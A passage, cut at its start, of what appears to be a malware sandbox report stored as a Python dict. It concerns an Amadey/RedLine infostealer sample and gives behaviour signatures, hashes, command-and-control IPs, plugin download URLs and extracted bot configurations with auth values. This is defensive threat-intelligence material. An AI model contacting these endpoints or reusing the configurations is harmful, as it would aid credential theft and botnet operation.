            "target": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46.exe",
            "backend": "sbx4m11",
            "resource": "win10-20220812-en",
            "task_name": "dridex",
            "os": "windows10-1703-x64",
            "timeout": 150,
            "sigs": 17,
        },
        {"sample": "230220-tbqs7sah7x", "kind": "static", "name": "static1", "status": "reported", "score": 1},
    ],
    "analysis": {
        "score": 10,
        "family": ["amadey", "redline"],
        "tags": [
            "family:amadey",
            "family:redline",
            "botnet:fuma",
            "botnet:kk1",
            "botnet:ronam",
            "discovery",
            "evasion",
            "infostealer",
            "persistence",
            "spyware",
            "stealer",
            "trojan",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1"],
            "score": 10,
            "target": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
            "size": 1118720,
            "md5": "0975c6819cc2c657b6fb6fcc0cc3fea0",
            "sha1": "5361dbd526a501fc7a7acfdba5b1c4f11e2fddaf",
            "sha256": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
            "sha512": "6fbeefdee3f0158bb32c162ef4bd6622d28d9745061238211fb90fca1e9a75b3"
            "548233b00c607ab180084fabc9989bee74d6b45c6c9ada5a79e23bff6f0c31cd",
            "ssdeep": "24576:DyOv/uT80oe5rUHqWXaQZavFL6pdSVwqyHX7Y/tyAE4mxO6wAh:WOv/uUe5rUfXxWxkdSCvHrr4mxO",
            "tags": [
                "family:amadey",
                "family:redline",
                "botnet:fuma",
                "botnet:kk1",
                "botnet:ronam",
                "discovery",
                "evasion",
                "infostealer",
                "persistence",
                "spyware",
                "stealer",
                "trojan",
            ],
            "family": ["amadey", "redline"],
            "signatures": [
                {
                    "label": "amadey",
                    "name": "Amadey",
                    "score": 10,
                    "tags": ["trojan", "family:amadey"],
                    "desc": "Amadey bot is a simple trojan bot primarily used for "
                    "collecting reconnaissance information.",
                },
                {
                    "label": "modifies_realtime_protection_registry",
                    "name": "Modifies Windows Defender Real-time Protection settings",
                    "score": 10,
                    "ttp": ["T1112", "T1031", "T1089"],
                    "tags": ["evasion", "trojan"],
                },
                {
                    "label": "redline",
                    "name": "RedLine",
                    "score": 10,
                    "tags": ["infostealer", "family:redline"],
                    "desc": "RedLine Stealer is a malware family written in C#, first appearing in early 2020.",
                },
                {
                    "name": "RedLine payload",
                    "score": 10,
                    "indicators": [
                        {
                            "resource": "behavioral1/memory/4924-438-"
                            "0x0000000002260000-0x00000000022A6000-memory.dmp",
                            "yara_rule": "family_redline",
                        },
                        {
                            "resource": "behavioral1/memory/4924-443-0x00000000023F0000-"
                            "0x0000000002434000-memory.dmp",
                            "yara_rule": "family_redline",
                        },
                    ],
                },
                {"name": "Executes dropped EXE", "score": 7},
                {"name": "Loads dropped DLL", "score": 7},
                {
                    "label": "browser_user_data_harvesting",
                    "name": "Reads user/profile data of web browsers",
                    "score": 7,
                    "ttp": ["T1005", "T1081"],
                    "tags": ["spyware", "stealer"],
                    "desc": "Infostealers often target stored browser data, which can include saved credentials etc.",
                },
                {
                    "label": "modifies_windows_security_registry",
                    "name": "Windows security modification",
                    "score": 7,
                    "ttp": ["T1089", "T1112"],
                    "tags": ["evasion", "trojan"],
                },
                {
                    "label": "sig_crypto_wallet",
                    "name": "Accesses cryptocurrency files/wallets, possible credential harvesting",
                    "score": 6,
                    "ttp": ["T1005", "T1081"],
                    "tags": ["spyware"],
                },
                {
                    "label": "creates_runkey_registry",
                    "name": "Adds Run key to start application",
                    "score": 6,
                    "ttp": ["T1060", "T1112"],
                    "tags": ["persistence"],
                },
                {
                    "label": "checks_uninstall_regkeys",
                    "name": "Checks installed software on the system",
                    "score": 6,
                    "ttp": ["T1012"],
                    "tags": ["discovery"],
                    "desc": "Looks up Uninstall key entries in the registry to enumerate software on the system.",
                },
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                    "desc": "Attempts to interact with connected "
                    "storage/optical drive(s). Likely ransomware behaviour.",
                },
                {
                    "label": "schtasks_persist",
                    "name": "Creates scheduled task(s)",
                    "ttp": ["T1053"],
                    "tags": ["persistence"],
                    "desc": "Schtasks is often used by malware "
                    "for persistence or to perform post-infection execution.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "iocs": {
                "urls": [
                    "http://193.233.20.15/dF30Hn4m/index.php",
                    "http://193.233.20.15/dF30Hn4m/Plugins/cred64.dll",
                    "http://193.233.20.15/dF30Hn4m/Plugins/clip64.dll",
                ],
                "ips": [
                    "193.233.20.17",
                    "51.11.192.50",
                    "176.113.115.17",
                    "8.238.23.254",
                    "193.233.20.15",
                    "93.184.220.29",
                ],
            },
        }
    ],
    "signatures": [
        {
            "label": "amadey",
            "name": "Amadey",
            "score": 10,
            "tags": ["trojan", "family:amadey"],
            "desc": "Amadey bot is a simple trojan bot primarily used for collecting reconnaissance inf.",
        },
        {
            "label": "modifies_realtime_protection_registry",
            "name": "Modifies Windows Defender Real-time Protection settings",
            "score": 10,
            "ttp": ["T1112", "T1031", "T1089"],
            "tags": ["evasion", "trojan"],
        },
        {
            "label": "redline",
            "name": "RedLine",
            "score": 10,
            "tags": ["infostealer", "family:redline"],
            "desc": "RedLine Stealer is a malware family written in C#, first appearing in early 2020.",
        },
        {
            "name": "RedLine payload",
            "score": 10,
            "indicators": [
                {
                    "resource": "behavioral1/memory/4924-438-0x0000000002260000-0x00000000022A6000-memory.dmp",
                    "yara_rule": "family_redline",
                },
                {
                    "resource": "behavioral1/memory/4924-443-0x00000000023F0000-0x0000000002434000-memory.dmp",
                    "yara_rule": "family_redline",
                },
            ],
        },
        {"name": "Executes dropped EXE", "score": 7},
        {"name": "Loads dropped DLL", "score": 7},
        {
            "label": "browser_user_data_harvesting",
            "name": "Reads user/profile data of web browsers",
            "score": 7,
            "ttp": ["T1005", "T1081"],
            "tags": ["spyware", "stealer"],
            "desc": "Infostealers often target stored browser data, which can include saved credentials etc.",
        },
        {
            "label": "modifies_windows_security_registry",
            "name": "Windows security modification",
            "score": 7,
            "ttp": ["T1089", "T1112"],
            "tags": ["evasion", "trojan"],
        },
        {
            "label": "sig_crypto_wallet",
            "name": "Accesses cryptocurrency files/wallets, possible credential harvesting",
            "score": 6,
            "ttp": ["T1005", "T1081"],
            "tags": ["spyware"],
        },
        {
            "label": "creates_runkey_registry",
            "name": "Adds Run key to start application",
            "score": 6,
            "ttp": ["T1060", "T1112"],
            "tags": ["persistence"],
        },
        {
            "label": "checks_uninstall_regkeys",
            "name": "Checks installed software on the system",
            "score": 6,
            "ttp": ["T1012"],
            "tags": ["discovery"],
            "desc": "Looks up Uninstall key entries in the registry to enumerate software on the system.",
        },
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware.",
        },
        {
            "label": "schtasks_persist",
            "name": "Creates scheduled task(s)",
            "ttp": ["T1053"],
            "tags": ["persistence"],
            "desc": "Schtasks is often used by malware for persistence or to perform post-infection exec.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/4924-438-0x0000000002260000-0x00000000022A6000-memory.dmp",
            "resource": "behavioral1/memory/4924-438-0x0000000002260000-0x00000000022A6000-memory.dmp",
            "config": {"family": "redline", "rule": "RedLine"},
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/4924-443-0x00000000023F0000-0x0000000002434000-memory.dmp",
            "resource": "behavioral1/memory/4924-443-0x00000000023F0000-0x0000000002434000-memory.dmp",
            "config": {
                "family": "redline",
                "rule": "RedLine",
                "c2": ["193.233.20.17:4139"],
                "botnet": "ronam",
                "attr": {"auth_value": "125421d19d14dd7fd211bc7f6d4aea6c"},
            },
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "files/0x000600000001ac25-492.dat",
            "resource": "behavioral1/files/0x000600000001ac25-492.dat",
            "config": {
                "family": "redline",
                "rule": "RedLine",
                "c2": ["193.233.20.17:4139"],
                "botnet": "fuma",
                "attr": {"auth_value": "116ab7335d0316d186d563bd6d41b9dd"},
            },
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "files/0x000800000001ac1c-630.dat",
            "resource": "behavioral1/files/0x000800000001ac1c-630.dat",
            "config": {
                "family": "amadey",
                "rule": "AmadeyV2",
                "c2": ["193.233.20.15/dF30Hn4m/index.php"],
                "version": "3.67",
            },
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/4340-722-0x0000000000400000-0x0000000000432000-memory.dmp",
            "resource": "behavioral1/memory/4340-722-0x0000000000400000-0x0000000000432000-memory.dmp",
            "config": {
                "family": "redline",
                "rule": "RedLine",
                "c2": ["176.113.115.17:4132"],
                "botnet": "kk1",
                "attr": {"auth_value": "df169d3f7f631272f7c6bd9a1bb603c3"},
            },
        },
    ],
}
